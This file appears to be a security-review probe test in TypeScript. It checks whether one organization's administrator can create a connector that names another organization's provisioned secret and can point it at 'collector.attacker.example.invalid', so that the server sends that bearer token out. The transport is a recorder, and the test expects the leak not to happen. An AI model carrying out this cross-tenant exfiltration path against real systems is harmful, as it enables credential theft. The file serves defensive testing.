// code-security-reviewer DG6 round 2 probe (new): a SecretRef is not bound to the setting or the organization it was
// provisioned for. NOT part of the candidate; copied into a disposable clone's tests/qa/integration by checks.sh and
// removed afterwards. Every value is SYNTHETIC.
//
// ADR-0052 §5: "a SecretRef names a secret IT holds for this setting". After F-DG6-120 the env provider resolves any
// MTH_SECRET_<NAME> for any consumer in any organization. Scenario (a multi-organization installation):
//   - IT provisions MTH_SECRET_CS_R2_ORGB_ERP_TOKEN for organization B's connector; B's ADM_TECH configures it;
//   - A's ADM_TECH (no role in B) creates a connector in organization A whose bearer names B's secret, pointed at a
//     host A's admin chooses, and runs the connector test.
// Expectation stated as the CORRECT behaviour: B's secret never leaves the server for A's connector (refused at write
// time, or unresolvable for A). The `resolvable` flag of the stored reference is also logged (an oracle inside the
// namespace). Only the network transport is replaced by a recorder.
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  createConnectorAdapterRegistry,
  setConnectorAdapters,
  type ConnectorAdapterRegistry,
} from "../../../apps/api/src/modules/integrations/adapters/port.ts";
import { createHttpPullAdapter } from "../../../apps/api/src/modules/integrations/adapters/http-pull.ts";
import { call, createUser, grant, seedWorld, signIn, startApi, uniq, type TestApi } from "../../../apps/api/test/support/harness.ts";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Body = any;
const L = "/api/v1/admin/connectors";
const ORGB_TOKEN = "synthetic-orgb-erp-token-cs-r2-e3f1";

const captured: { url: string; authorization: string | null }[] = [];
let api: TestApi;
let previous: ConnectorAdapterRegistry;

beforeAll(async () => {
  process.env.MTH_SECRET_CS_R2_ORGB_ERP_TOKEN = ORGB_TOKEN;
  api = await startApi();
  previous = setConnectorAdapters(
    createConnectorAdapterRegistry([
      createHttpPullAdapter({
        transport: async (url, init) => {
          const h = (init.headers ?? {}) as Record<string, string>;
          captured.push({ url, authorization: h["authorization"] ?? null });
          return new Response(JSON.stringify({ rows: [], rowCount: 0, controlTotal: null }), { status: 200 });
        },
      }),
    ]),
  );
}, 240_000);

afterAll(async () => {
  setConnectorAdapters(previous);
  delete process.env.MTH_SECRET_CS_R2_ORGB_ERP_TOKEN;
  await api?.close();
});

function body(orgId: string, endpointUrl: string, name: string) {
  return {
    organizationId: orgId,
    code: uniq("xorg-").toLowerCase(),
    nameEn: "Synthetic source",
    nameAr: "مصدر اصطناعي",
    adapterKind: "http_pull",
    targetKind: "none",
    config: {
      sourceSystemId: "synthetic.source:v1",
      endpointUrl,
      credentialRefs: { bearer: { provider: "env", name } },
      fieldMappings: [],
      targetTransformationId: null,
      cadence: "manual",
      retryMaxAttempts: 0,
      retryBackoffSeconds: 60,
      commitMode: "manual",
      commitOnBehalfOf: null,
      outboundActions: [],
      reconciliationRule: "none",
      adapterSettings: {},
      reason: "Synthetic cross-organization SecretRef probe.",
    },
  };
}

describe("cs-r2: SecretRefs are bound to neither setting nor organization", () => {
  it("organization A's ADM_TECH sends organization B's connector secret to a host of their choice", async () => {
    const w = await seedWorld(api.db);
    const adminA = await signIn(api.app, w.admin.subject); // ADM_TECH + ADM_ACCESS @ orgA only
    const b = await createUser(api.db, w.orgB.id);
    await grant(api.db, w.grantor.id, b.id, "ADM_TECH", { type: "organization", id: w.orgB.id }, w.orgB.id);
    const adminB = await signIn(api.app, b.subject);

    // Organization B's real connector, with the secret IT provisioned for it.
    const own = await call<Body>(api.app, "POST", L, {
      session: adminB,
      body: body(w.orgB.id, "https://erp.orgb.example.invalid/api", "MTH_SECRET_CS_R2_ORGB_ERP_TOKEN"),
    });
    console.log("org B connector", own.status, JSON.stringify(own.body?.config?.credentialRefs ?? own.body).slice(0, 200));
    expect(own.status).toBe(201);
    // Organization A's admin cannot read organization B's connector.
    const peek = await call<Body>(api.app, "GET", `${L}/${own.body.id}`, { session: adminA, contract: false });
    console.log("org A admin GET org B connector", peek.status);

    // Organization A's admin names B's secret in an organization-A connector pointed at their own host.
    const a = await call<Body>(api.app, "POST", L, {
      session: adminA,
      body: body(w.orgA.id, "https://collector.attacker.example.invalid/x", "MTH_SECRET_CS_R2_ORGB_ERP_TOKEN"),
      contract: false,
    });
    console.log("org A connector naming B's secret", a.status, JSON.stringify(a.body?.config?.credentialRefs ?? a.body).slice(0, 300));
    let sent: string[] = [];
    if (a.status === 201) {
      const t = await call<Body>(api.app, "POST", `${L}/${a.body.id}/test`, { session: adminA, body: {} });
      console.log("org A test", t.status, t.body?.status, t.body?.errorCode);
      sent = captured.filter((c) => c.url.includes("attacker")).map((c) => c.authorization ?? "");
      console.log("captured at the attacker host", JSON.stringify(sent));
    }
    expect(sent.some((h) => h.includes(ORGB_TOKEN))).toBe(false);
  }, 180_000);
});
